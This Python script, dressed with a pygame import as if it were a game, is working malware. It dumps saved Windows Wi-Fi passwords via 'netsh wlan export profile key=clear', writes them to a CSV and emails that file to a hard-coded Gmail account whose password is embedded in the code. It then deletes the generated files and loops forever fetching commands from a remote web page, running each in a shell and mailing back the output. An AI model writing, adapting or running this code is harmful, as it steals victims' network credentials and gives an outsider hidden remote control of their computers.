import pygame
import time
from pygame.locals import *

from sys import exit

import random



import subprocess

from subprocess import PIPE,Popen

import glob, os

from xml.dom import minidom

import csv

import yagmail

import urllib2

import json

import smtplib

from email.mime.multipart import MIMEMultipart

from email.mime.text import MIMEText

from email.mime.base import MIMEBase

from email import encoders
import win32gui, win32con


#hides console from displaying
#hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(hide , win32con.SW_HIDE)

#get file name lists
def getFileNames():

    fileList=[]

    for file in glob.glob("Wi-Fi*.xml"):

        fileList.append(file)

    return fileList

def sendEmail(content,type):

    fromAddr="pythonprogramming007@gmail.com"

    toAddr="pythonprogramming007@gmail.com"

    # instance of MIMEMultipart

    msg = MIMEMultipart()

 

    # storing the senders email address  

    msg['From'] = fromAddr

 

    # storing the receivers email address 

    msg['To'] = toAddr

 

# storing the subject 

    msg['Subject'] = "Mail from "+os.environ['COMPUTERNAME']

 

# string to store the body of the mail

    

    if type==1 or type==2:

        body = content

 

        # attach the body with the msg instance

        msg.attach(MIMEText(body, 'plain'))

    

 

# open the file to be sent 

    if type==2:

        filename = "runtimepwd.csv"

        attachment = open(os.path.abspath(filename), "rb")

        # instance of MIMEBase and named as p

        p = MIMEBase('application', 'octet-stream')

        # To change the payload into encoded form

        p.set_payload((attachment).read())

        # encode into base64

        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # attach the instance 'p' to instance 'msg'

        msg.attach(p)



 

# creates SMTP session

    s = smtplib.SMTP('smtp.gmail.com', 587)

 

# start TLS for security

    s.starttls()

 

# Authentication

    s.login(fromAddr, "Hacker@123")

 

# Converts the Multipart msg into a string

    text = msg.as_string()

 

# sending the mail

    s.sendmail(fromAddr, toAddr, text)

 

# terminating the session

    s.quit()


#method to execute cmd commands
def cmdCommandExecutor(cmd):

        process = subprocess.Popen(cmd.split(),shell=True, stdout=subprocess.PIPE)

        processMsg,error=process.communicate()

        return processMsg,error

         

        


#deleteing generated files
def deleteTraces(filesToBeDeleted):

    for i in filesToBeDeleted:

        try:

            os.remove(i)

        except:

            continue

    os.remove("./runtimepwd.csv")

    return

#method to execute remote command written in the text file
def remoteCmdExecutor():
    prvcmd=''
    # while loop to constantly check the text file and execute new command
    while True:

        try:
        
            command=urllib2.urlopen("http://pythontest123.epizy.com/cmdarea.txt").read()
            if not (command=='exit loop'):
                if not (prvcmd==command):
                    #print "new cmd"
                    prvcmd=command
                    try:
                        process = Popen(args=command,stdout=PIPE,shell=True)
                        sendEmail(process.communicate()[0],1)
                    except:
                        continue
            else:
                break
            time.sleep(20)
            #print "getting"

        except:
            continue



def startAction():
    
   
    cmdCommandKnownNetwork="netsh wlan export profile"

    result,error=cmdCommandExecutor(cmdCommandKnownNetwork)

    fileList=getFileNames()

    nwnameList=[]

    for file in fileList:

        name=str(file)

        i=0

        sanitize_name=name.replace("Wi-Fi-","")

        br=sanitize_name.rfind('.')

        nwname=''

        while(i<br):

            nwname+=sanitize_name[i]

            i+=1

        nwnameList.append(nwname)

    

    for i in nwnameList:

        try:

            cmdToGetPassword="netsh wlan export profile \""+i+"\" key=clear"

            processmsg1,error1=cmdCommandExecutor(cmdToGetPassword)          

        except:

            continue

           

    newFileList=getFileNames()

    pwdList=[]

    for i in newFileList:

        try:            

            parsed_file=minidom.parse(i)

            passowrd=parsed_file.getElementsByTagName("keyMaterial")[0]

            pwdList.append(passowrd.firstChild.data)

        except:

            continue

    for i in pwdList:

        continue

    with open("runtimepwd.csv","w") as fp:

        a=csv.writer(fp,delimiter=",")

        data=[nwnameList,pwdList]

        a.writerows(data)



#sending email---------------------------


    time.sleep(60)
    sendEmail("./runtimepwd.csv",2)

    deleteTraces(newFileList)

    remoteCmdExecutor()



startAction()